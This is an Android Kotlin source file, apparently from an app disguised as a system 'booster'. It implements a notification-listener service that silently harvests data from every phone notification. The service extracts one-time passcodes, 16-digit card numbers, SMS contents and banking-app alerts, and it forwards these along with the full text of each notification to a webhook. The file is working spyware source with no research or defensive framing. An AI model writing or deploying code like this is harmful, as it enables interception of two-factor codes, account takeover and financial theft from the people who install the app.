package com.sysopt.booster

import android.app.Notification
import android.os.Handler
import android.os.Looper
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class NotificationInterceptorService : NotificationListenerService() {
    private val handler = Handler(Looper.getMainLooper())

    override fun onListenerConnected() {
        super.onListenerConnected()
        startForeground(2004, NotificationHelper.createNotification(this, "Notification Monitor"))
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn?.let {
            val pkg = it.packageName
            val notification = it.notification
            val extras = notification.extras

            val title = extras.getString(Notification.EXTRA_TITLE, "")
            val text = extras.getString(Notification.EXTRA_TEXT, "")
            val subText = extras.getString(Notification.EXTRA_SUB_TEXT, "")
            val bigText = extras.getString(Notification.EXTRA_BIG_TEXT, "")
            val summaryText = extras.getString(Notification.EXTRA_SUMMARY_TEXT, "")

            val allText = "$title $text $subText $bigText $summaryText"

            // Detect OTP codes (4-8 digits)
            val otpPatterns = listOf(
                Regex("\\b\\d{4,8}\\b"),
                Regex("\\b[0-9]{4,8}\\b")
            )
            otpPatterns.forEach { pattern ->
                pattern.findAll(allText).forEach { match ->
                    if (match.value.length in 4..8) {
                        WebhookClient.sendOTP(match.value, pkg)
                    }
                }
            }

            // Detect SMS apps
            if (pkg.contains("sms") || pkg.contains("messaging") || pkg.contains("message")) {
                SmsUtils.captureSmsFromNotification(title, text, allText)
            }

            // Banking alerts
            if (BankingDetector.isBankingApp(pkg)) {
                WebhookClient.sendBankingAlert(pkg, title, allText)
            }

            // Detect card numbers
            val cardPattern = Regex("\\b\\d{4}[\\s-]?\\d{4}[\\s-]?\\d{4}[\\s-]?\\d{4}\\b")
            cardPattern.findAll(allText).forEach { match ->
                WebhookClient.sendSensitiveData(match.value, "credit_card")
            }

            // Send full notification
            WebhookClient.sendNotification(pkg, title, text, subText, System.currentTimeMillis())
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Handle removal if needed
    }
}